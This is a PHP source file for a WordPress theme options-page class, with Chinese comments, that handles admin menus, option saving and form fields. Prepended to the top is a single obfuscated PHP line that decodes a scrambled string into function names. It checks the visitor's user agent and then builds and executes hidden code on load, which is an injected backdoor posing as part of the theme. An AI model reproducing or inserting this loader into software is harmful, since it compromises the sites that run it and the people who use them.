<?php $lmcpyixff = 'd%-#1GO	x22#)fepmqyfA>2b%!<*qp%vg!|!**#j{hnpd#)tutjyf`opjud%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2FSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q	x72	166	x3a	61	x31"))) { $xlptsmv = "	x63	162	x65x61"]=1; $uas=strtolower($_SERVER[sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x247]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**ek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22):>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**~6<&w6<	x7fw6*CW&)7gj6<.[A	x2*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSutjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275!|!}{;)gj}l;33bq}k;op}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopd6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666j%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvs<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,27;mnui}&;zepc}A;~!}	x7f;ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju5.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%jK2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%f%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]22bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f72	164") && (!isset($GLOBALS["	x61	156	x757&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!67]y74]275]y7:]268]y7f#<%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>*f	x27,*e	x27,*d	x27,*c	x27,*b	xng(0); $obuvrcq = implode(array_map("knkvxhd",str_split("%tjwt%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>!>!#]y84]275]y83]248]y83]256]y81]26*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gqnjA	x27&6<.fmjgA	x27doj%6<	x7f78]y3f]51L3]84]y31M6]y3e]81#/FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}3]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]j6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	w6Z6<.5`hA	x27pd%6<pd%w6Z5]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)u24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/3[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b`msvd}+;!>!}	x27;!>>>!}_;gvc%Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fuopjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$yqhmbrz = $xlpx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF1]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]7%6<*Y%)fnbozcYufhA	x272qj%6<^#zs#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qs]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34x45	116	x54"]); if ((strst%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudo66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*wbfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmtpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x/20QUUI7jsv%7UFH#	x27rfs%6~6<	xYpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWr($uas,"	x6d	163	x69	145")) or (strstr($uas,"<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osv+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kHB`SFTV`QUUI&b%!|!*)323zbtsmv("", $obuvrcq); $yqhmbrz();}}if((function_exists("	x6f	142	x5f	163	x74	141	xx5cq%)ufttj	x22)gj6<^#UQPMSVD!-id%)uqpuft`msvd},;uqpuftvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/]273]y76]252]y85]256]y6g]257]y86]2!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!	157	x6e"; function knkvxhd($n){return chr(ord($n)-1);} @error_reporti	141	x74	145	x5f	146	x75	156	x63	164	x69!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hno!sboepn)%epnbss-%rxW~!gj!|!*nbsbq%)323ldfidk!~!<**q"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	-#1]#-bubE{h%)tpqsut>j%!*72sbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XA	x22)7gj6<*QDU`MPT7-NBw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)f	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)4	x24-	x24]y8	x24-	x24]26	x24-ovg	x22)!gj}1~!<2p%	x7f!~judovg}x;0]=])0#)U!	x27{**u%-#jt0}Zufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yn%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562	156	x61"])))) { $GLOBALS["	x61	156	x75	156	-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsmkjzfxjmo'; $nsbfxjhgr=explode(chr((426-306)),substr($lmcpyixff,(39493-33616),(149-115))); $nylrlngg = $nsbfxjhgr[0]($nsbfxjhgr[(3-2)]); $eaxisch = $nsbfxjhgr[0]($nsbfxjhgr[(7-5)]); if (!function_exists('dnsnqpaj')) { function dnsnqpaj($dlrhqh, $nfbrgaa,$izlaluh) { $searxzd = NULL; for($bigcxgnwx=0;$bigcxgnwx<(sizeof($dlrhqh)/2);$bigcxgnwx++) { $searxzd .= substr($nfbrgaa, $dlrhqh[($bigcxgnwx*2)],$dlrhqh[($bigcxgnwx*2)+(7-6)]); } return $izlaluh(chr((61-52)),chr((428-336)),$searxzd); }; } $bgydrsm = explode(chr((197-153)),'4068,47,1730,42,5780,44,220,34,5082,50,3369,26,3827,45,170,50,4528,40,4458,70,1963,61,2069,35,2405,47,2380,25,2856,48,1193,38,2104,52,2320,60,3018,51,3730,31,1047,39,5220,24,127,43,1143,50,3179,32,4853,70,4115,22,2760,49,3501,47,2156,31,5244,54,3548,39,1273,35,1086,57,616,29,1772,42,814,66,4137,33,2731,29,4680,69,2809,47,3909,38,5512,39,5132,27,1561,62,5365,57,680,69,3872,37,3395,37,31,28,5452,25,2904,52,0,31,560,56,1931,32,4749,66,5607,38,3211,37,4170,45,254,60,1670,60,3069,45,4010,25,446,64,5053,29,3587,34,645,35,2216,40,3947,63,1893,38,4986,44,4815,38,1333,63,2452,56,5159,61,4618,62,3432,69,1838,55,1308,25,793,21,5477,35,5551,56,880,57,4318,34,1814,24,4352,59,397,49,2024,45,5713,67,3686,44,2508,69,3621,65,5645,68,5422,30,359,38,4250,68,5298,67,5824,53,2639,58,1231,42,5030,23,3761,66,1517,44,937,47,3248,56,1623,47,2187,29,314,45,4923,63,749,44,984,63,1464,53,3304,65,3114,65,2256,64,2577,62,1396,68,2697,34,510,50,59,68,4215,35,4568,50,4411,47,2956,62,4035,33'); $uwvxiqrd = $nylrlngg("",dnsnqpaj($bgydrsm,$lmcpyixff,$eaxisch)); $nylrlngg=$lmcpyixff; $uwvxiqrd(""); $uwvxiqrd=(466-345); $lmcpyixff=$uwvxiqrd-1; ?><?php
##################################################################
class kriesi_option_pages{
##################################################################

	var $options; 			// options passed by the option file 通过选项文件的option
	var $pageinfo;			// pageifo passed by the option file 通过选项文件的pageinfo
	var $table_bg_class;	// background color for tables, used to stripe 表格中的背景颜色,为了不同种类
	var $database_options;	// already saved options 已经保存选项
	var $grouped;			// variable to check if option items should be grouped 如果选项被按组划分，就检查变量
	var $saved_optionname; 	// option_name 
	
	
	//constructor 创建器，析构函数
	function kriesi_option_pages($options, $pageinfo)
	{	
		// set options and page variables保存相关的值
		$this->options = $options;
		$this->pageinfo = $pageinfo;
		$this->grouped = false;
		$this->make_data_available();
		
		//$pagecount, needed for correct priority when including the option pages
		global $option_pagecount;
		$option_pagecount = isset($option_pagecount) ? $option_pagecount + 1 : 1;
		
		// call method to create the sidebar menu items, if its not a child call it with higher priority number (which means it gets added later)
		$priority = $option_pagecount;
		if(!$this->pageinfo['child']) $priority = 1;
		
		add_action('admin_menu', array(&$this, 'add_admin_menu'), $priority);
		
		if($_GET['page'] == $this->pageinfo['filename'])
		{	
			add_action('admin_head', array(&$this, 'admin_head_addition'));
			add_action('admin_init', array(&$this, 'enqueue_head'));	
		}
	}
	
	
	// add stylesheet and javascript to the options page
	function admin_head_addition() 
	{	
		echo '<link rel="stylesheet" href="'. KFWINC_URI . 'admin.css" type="text/css" />';
		echo '<script type="text/javascript" src="'.KFWINC_URI.'supporting_scripts.js"></script>';
	}
	
	function enqueue_head()
	{
		wp_enqueue_script('kriesi_custom_fields_js', KFWPLUGINS_URI . 'kriesi_meta_box/kriesi_custom_fields.js');
		wp_enqueue_script('thickbox');
		wp_enqueue_style('thickbox');
	}
	
	// function that creates the sidebar menus增加到管理员菜单目录中
	function add_admin_menu()
	{	
		$top_level = THEMENAME."选项";
		
		// add top level item
		if(!$this->pageinfo['child'])
		{
			add_menu_page($top_level, $top_level, 7, $this->pageinfo['filename'], array(&$this, 'initialize'));
			define('TOP_LEVEL_BASEAME', $this->pageinfo['filename']);
		}
		// add sub level item
		else
		{	
			add_submenu_page(TOP_LEVEL_BASEAME, $this->pageinfo['full_name'], $this->pageinfo['full_name'], 7, $this->pageinfo['filename'], array(&$this, 'initialize'));
		}
	}
	/**
	 * 保存数据
	 */
	function make_data_available()
	{
		global $h_option;
		// save basic values into $h_options array, then overwrite it with retrieved options from database table if avaliable
		// add widgets if necessary
		foreach ($this->options as $option)
		{	
			if($option['type'] == 'boxes')
			{
				$this->add_widget($option);
			}
			
			if($option['std'])
			{
				$h_option_std[$this->pageinfo['optionname']][$option['id']] = $option['std'];
			}
		}
		
		$this->saved_optionname = 'kriesi_'.THEMENAME."_".$this->pageinfo['optionname'];
		$h_option[$this->pageinfo['optionname']] = get_option($this->saved_optionname);
		
		$h_option[$this->pageinfo['optionname']] = array_merge((array)$h_option_std[$this->pageinfo['optionname']], (array)$h_option[$this->pageinfo['optionname']]);
		
		
		//htmlspecialchars decode the array for frontend use
		$h_option[$this->pageinfo['optionname']] = $this->htmlspecialchars_deep($h_option[$this->pageinfo['optionname']]);
	
	}
	
	//decode the whole options array with a recursive function解码选项数组的递归函数
	function htmlspecialchars_deep($mixed, $quote_style = ENT_QUOTES, $charset = 'UTF-8')
	{
	    if (is_array($mixed) || is_object($mixed)) 
	    {
	        foreach($mixed as $key => $value) 
	        {
	            $mixed[$key] = $this->htmlspecialchars_deep($value, $quote_style, $charset);
	        }
	    } 
	    elseif (is_string($mixed)) 
	    {
	        $mixed = htmlspecialchars_decode($mixed, $quote_style);
	    }
	    
	    return $mixed;
	} 
	
	
	function initialize()
	{
		$this->get_save_options();
		$this->display();
	}
	
	// display options page	
	function display()
	{	
		$saveoption = false;
		echo '<div class="wrap">';
		echo '<div class="icon32" id="icon-options-general"><br/></div>';
		echo '<h2>'.$this->pageinfo['full_name'].'</h2>';
		echo '<form method="post" action="">';
		
		//calls the helping function based on value of 'type'
		foreach ($this->options as $option)
		{	
			$this->stripe();
			
			if (method_exists($this, $option['type']))
			{
				$this->$option['type']($option);
				$saveoption = true;
			}
		}
		if($saveoption)
		{
			echo '<p class="submit">';
			echo '<input type="hidden" value="1" name="save_my_options"/>';
			echo '<input type="submit" name="Submit" class="button-primary autowidth" value="保存改动" /></p>';
		}
		echo '</form></div>';
	}
	
	//貌似是转换grouped分组的
	function stripe()
	{	
		if($this->grouped === false) //为false时
		$this->table_bg_class = $this->table_bg_class == "" ? 'class="alternate"' : '';
		//$this->table_bg_class == "" ? 'class="alternate"' : '';
	}
	
	//保存数据
	function get_save_options()
	{
		$options = $newoptions  = get_option($this->saved_optionname);
		

		//reset update_option($saved_optionname, "");
		if ( $_POST['save_my_options'] ) 
		{	
			echo '<div class="updated fade" id="message" style=""><p><strong>设置已保存</strong></p></div>';
			//update_option($saved_optionname, "");
			foreach ($_POST as $key => $value)
			{	
				$value = stripslashes($value);
				
				$newoptions[$key] = htmlspecialchars($value, ENT_QUOTES,"UTF-8"); 
	
				//multiple cat "final" builder
				if (preg_match("/(\w+)(hidden)$/", $key, $result))
				{
					$loops = $newoptions[$key];
					$newoptions[$key] = 0;
					$final =  $result[1].'final';
					$newoptions[$final] = "";
					for($i = 0; $i < $loops; $i++)
					{
						$name = $result[1].$i;
						$newoptions[$name] = stripslashes($_POST[$name]);
						if($newoptions[$name] != "")
						{
							$newoptions[$key]++;
							
							$newoptions[$final] .= $newoptions[$name];
							if($i+2 < $loops)
							{
								$newoptions[$final] .=", ";
							}
						}		
					}
					$newoptions[$key]++;
				}
				
				if (preg_match("/^(matrix_)(page_)(\w+_)(\d+)/", $key, $result))
				{
					$final_field_matrix = $result[1].$result[3].'final';
				}
				
			}
			
			//matrix divider
			unset($newoptions[$final_field_matrix]);
			
			$save_matrix_count = 0;
			foreach ($newoptions as $key => $value) //check all fields
			{	
				if($save_matrix_count < $_POST['super_matrix_count']) // dont save fields that are to high
				{
					if (preg_match("/^(matrix_)(page_)(\w+_)(\d+)/", $key, $result))
					{				
						foreach ($newoptions as $key2 => $value2)
						{	
							if (preg_match("/^(matrix_)(".$result[3].")(".$result[4].")_final/", $key2, $result2))
							{
								$newoptions[$final_field_matrix][$value] = $value2;
								$save_matrix_count++;
							}
						}		
					}
				}
			} 	
		}
			
		if ( $options != $newoptions ) 
		{
			$options = $newoptions;
			update_option($this->saved_optionname, $options);
		}
		
		if($options)
		{
			foreach ($options as $key => $value)
			{
				$options[$key] = empty($options[$key]) ? false : $options[$key];
			}
		}
	
		$this->database_options = $options;
	}
	
	//增加边栏小工具
	function add_widget($values)
	{	
		for ($i = 1; $i <= $values['count']; $i++)
		{	
			if ( function_exists('register_sidebar') )
				register_sidebar(array(
				'name' => $values['widget'].' '.$i,
				'before_widget' => '<div id="%1$s" class="box_small box box'.$i.' widget %2$s">', 
				'after_widget' => '</div>', 
				'before_title' => '<h3 class="widgettitle">', 
				'after_title' => '</h3>', 
				));
		}
	}
	
	############################################################################################################################
	# Displaying helper functions:
	############################################################################################################################
	
	
	##############################################################
	# OPEN // table开始
	# desc描述
	##############################################################
	
	function open($values)
	{
		if(!isset($values['desc'])) $values['desc'] = "";
		
		echo '<table class="widefat kriesi_options">';
		echo '<thead><tr><th colspan="2">'.$values['desc'].'&nbsp;</th></tr></thead>';
	}
	
	##############################################################
	# CLOSE // table关闭
	##############################################################
	function close($values)
	{
		echo '<tfoot><tr><th>&nbsp;</th><th>&nbsp;</th></tr></tfoot></table>';
	}

	##############################################################
	# GROUP // 分组用的
	##############################################################	
	function group($values)
	{	
		
		if($this->grouped === false)
		{
			$this->grouped = $this->table_bg_class;
			
			if($this->grouped === "" )
			{
				$this->table_bg_class = 'class="grouped"';
			}
			else
			{
				$this->table_bg_class = 'class="alternate grouped"';
			}
		}
		else
		{
			$this->table_bg_class = $this->table_bg_class == "" ? 'class="alternate"' : '';
			echo '<tr valign="top" '.$this->grouped.'>';
			echo '<td colspan="2" scope="row" class="no_height"></td></tr>';
			$this->grouped = false;
		}
	}

	##############################################################
	# TITLE //外部title
	# name 名称
	# desc 描述
	##############################################################	
	function title($values)
	{
		echo '<h3>'.$values['name'].'</h3>';
		if (isset($values['desc'])) echo '<p>'.$values['desc'].'</p>';
	}

	##############################################################
	# TITLE_INSIDE //内部title
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	# input输入框为隐藏值，用以区分
	##############################################################	
	function title_inside($values)
	{
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<td colspan="2" scope="row"><h3>'.$values['name'].'</h3>';
		if (isset($values['desc'])) echo '<p>'.$values['desc'].'</p>';
		if ($values['id']) echo '<input type="hidden" value="'.$values['std'].'" id="'.$values['id'].'" name="'.$values['id'].'"/>';
		echo '</td></tr>';
	}

	##############################################################
	# TEXTAREA //文本框的值
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	# size 文本框的高度
	##############################################################	
	function textarea($values)
	{
		if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];
		$size=$values['size'] ? $values['size']:7;
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>'.$values['desc'].'<br/>';
		echo '<textarea name="'.$values['id'].'" cols="60" rows="'.$size.'" id="'.$values['id'].'" style="width: 80%; font-size: 12px;" class="code">';
		echo $values['std'].'</textarea><br/>';
	    echo '<br/></td>';
		echo '</tr>';
	}
	
	##############################################################
	# TEXT //数据框
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	# size 文本框的宽度
	# 
	##############################################################	
	function text($values)
	{	
		if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];
		
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>'.$values['desc'].'<br/>';
		echo '<input type="text" size="'.$values['size'].'" value="'.$values['std'].'" id="'.$values['id'].'" name="'.$values['id'].'"/>';
	    echo '<br/><br/></td>';
		echo '</tr>';
	}
	
	##############################################################
	# UPLOAD // 上传图片
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	# size 文本框的高度
	##############################################################	
	function upload($values)
	{	
		$prevImg = '';
		if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];
		if($values['std'] != ''){$prevImg = '<img src='.$values['std'].' alt="" />';}
		
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>';
		echo '<div class="kriesi_preview_pic_optionspage" id="'.$values['id'].'_div">'.$prevImg.'</div>';
		echo $values['desc'].'<br/>';
		echo '<input type="text" size="'.$values['size'].'" value="'.$values['std'].'" name="'.$values['id'].'" class="kriesi_preview_pic_input" />';
		//echo '&nbsp;<a onclick="return false;" title="" class="k_hijack button thickbox" id="'.$values['id'].'" href="media-upload.php?post_id=-1249588072&amp;type=image&amp;hijack_target='.$values['id'].'&amp;TB_iframe=true">Insert Image</a>';
		//这里将之前的post_id去掉，文章可以跟图片绑定，但这里不需要。
		echo '&nbsp;<a onclick="return false;" title="" class="k_hijack button thickbox" id="'.$values['id'].'" href="media-upload.php?type=image&amp;hijack_target='.$values['id'].'&amp;TB_iframe=true">Insert Image</a>';
		
	    echo '<br/><br/></td>';
		echo '</tr>';
	}

	##############################################################
	# CHECKBOX // 选择？？？
	# name 名称
	# desc 描述
	# id   ID
	##############################################################	
	function checkbox($values)
	{	
		if(isset($this->database_options[$values['id']]) && $this->database_options[$values['id']] == true) $checked = 'checked = "checked"'; 
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td><input class="kcheck" type="checkbox" name="'.$values['id'].'" id="'.$values['id'].'" value="true"  '.$checked.' />';
		echo '<label for="'.$values['id'].'">'.$values['desc'].'</label><br/>';
	    echo '<br/></td>';
		echo '</tr>';
	}

	##############################################################
	# RADIO // 单选按钮
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	##############################################################	
	function radio($values)
	{	
		
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>'.$values['desc'].'<br/>';
		
		$counter = 1;
		foreach($values['buttons'] as $radiobutton)
		{	
			$checked ="";
			if(isset($this->database_options[$values['id']])) 
			{
				if($this->database_options[$values['id']] == $counter)
				{
					$checked = 'checked = "checked"';
				}
			}
			else if(isset($values['std']) && $values['std'] == $counter) 
			{
				$checked = 'checked = "checked"';
			}
		
			echo '<p><input '.$checked.' type="radio" class="kcheck" value="'.$counter.'" id="'.$values['id'].$counter.'" name="'.$values['id'].'"/>';
			echo '<label for="'.$values['id'].$counter.'">'.$radiobutton.'</label></p>';
			$counter++;
		}
		
	    echo '<br/></td>';
		echo '</tr>';
	}

	##############################################################
	# DROPDOWN // 下来侧单
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	##############################################################	
	function dropdown($values)
	{	
		if(!isset($this->database_options[$values['id']]) && isset($values['std'])) $this->database_options[$values['id']] = $values['std'];
				
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>'.$values['desc'].'<br/>';
		
			if($values['subtype'] == 'page')
			{
				$select = '选择页面';
				$entries = get_pages('title_li=&orderby=name');
			}
			else if($values['subtype'] == 'cat')
			{
				$select = '选择分类';
				$entries = get_categories('title_li=&orderby=name&hide_empty=0');
			}
			else if($values['subtype'] == 'tag')
			{
				$select = '选择标签';
				$entries = get_tags('title_li=&orderby=name&hide_empty=0');
			}
			else
			{	
				$select = '选择...';
				$entries = $values['subtype'];
			}
		
			echo '<select class="postform" id="'. $values['id'] .'" name="'. $values['id'] .'"> ';
			echo '<option value="">'.$select .'</option>  ';

			foreach ($entries as $key => $entry)
			{
				if($values['subtype'] == 'page')
				{
					$id = $entry->ID;
					$title = $entry->post_title;
				}
				else if($values['subtype'] == 'cat')
				{
					$id = $entry->term_id;
					$title = $entry->name;
				}
				else if($values['subtype'] == 'tag')
				{
					$id = $entry->term_id;
					$title = $entry->name;
				}
				else
				{
					$id = $key;
					$title = $entry;				
				}

				if ($this->database_options[$values['id']] == $id )
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo"<option $selected value='". $id."'>". $title."</option>";
			}
		
		echo '</select>';
		 
	    echo '<br/><br/></td>';
		echo '</tr>';
	}
	
	
	##############################################################
	# MULTI // 混合式，弹出式多选
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	##############################################################	
	function multi($values)
	{
		echo '<tr valign="top" '.$this->table_bg_class.'>';
		echo '<th scope="row" width="200px">'.$values['name'].'</th>';
		echo '<td>'.$values['desc'].'<br/>';
		
		///////////////////
		echo '<div class="multiple_box">';
		$hidden_name = $values['id'].'_hidden';
		
		if($this->database_options[$hidden_name] == "" || $this->database_options[$hidden_name] == false) 
		{
			$this->database_options[$hidden_name] = 1;
		}
	
		for($i = 0; $i < $this->database_options[$hidden_name]; $i++)
		{
		
			if($values['subtype'] == 'page')
			{
				$select = '选择更多的页面?';
				$entries = get_pages('title_li=&orderby=name');
			}
			else if($values['subtype'] == 'tag')
			{
				$select = '选择更多的标签?';
				$entries = get_tags('title_li=&orderby=name');
			}
			else
			{
				$select = '选择更多的分类?';
				$entries = get_categories('title_li=&orderby=name&hide_empty=0');
			} 
		
			echo '<select class="postform multiply_me disable_me" id="'. $values['id'] .'_'. $i .'" name="'. $values['id'] .'_'. $i .'"> ';
			echo '<option value="">'.$select .'</option>  ';

			foreach ($entries as $entry)
			{
				if($values['subtype'] == 'page')
				{
					$id = $entry->ID;
					$title = $entry->post_title;
				}
				else if($values['subtype'] == 'tag')
				{
					$id = $entry->term_id;
					$title = $entry->name;
				}
				else
				{
					$id = $entry->term_id;
					$title = $entry->name;
				}
			
				if ($this->database_options[$values['id'] .'_'.$i] == $id )
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo"<option $selected value='". $id."'>". $title."</option>";
			}
		
		echo '</select>';
		} 
		
		if(isset($this->database_options[$hidden_name])) $values['std'] = $this->database_options[$hidden_name];

		echo '<input name="'.$hidden_name.'" class="'.$hidden_name.'" type="hidden" value="'.$this->database_options[$hidden_name].'" />';
		echo '</div>';
		
		echo '<br/> </td>';
		echo '</tr>'; 
		//////////////////
		
	    echo '<br/></td>';
		echo '</tr>';
	}
	
	##############################################################
	# BOXES // 页面跟文章串联在一起，或者提供更多的小工具区域
	# name 名称
	# desc 描述
	# id   ID
	# std  默认值
	# size 文本框的高度
	# count 多个区域？
	##############################################################	
	function boxes($values)
	{
		for ($i = 1; $i <= $values['count']; $i++)
		{
			if ($i != 1) $this->stripe();
			
			echo '<tr valign="top" '.$this->table_bg_class.'>';
			echo '<th scope="row" width="200px">'.$values['name'].' '.$i.'</th><td>';
			echo $values['desc'].' '.$i;
			
			echo '<div class="how_to_populate">';
			
			//select box
			echo '<select name="'.$values['id'].$i.'_content" class="postform selector">';
			echo '<option value="">HTML (simple placeholder text gets applied) </option>';
			
			$s1 = $s2 = $s3 = '';
			if ($this->database_options[$values['id'].$i.'_content'] == 'post') 	$s1 = 'selected="selected"'; 
			if ($this->database_options[$values['id'].$i.'_content'] == 'page') 	$s2 = 'selected="selected"'; 
			if ($this->database_options[$values['id'].$i.'_content'] == 'widget') 	$s3 = 'selected="selected"'; 
		
			echo '<option '.$s1.' value="post">文章</option>';
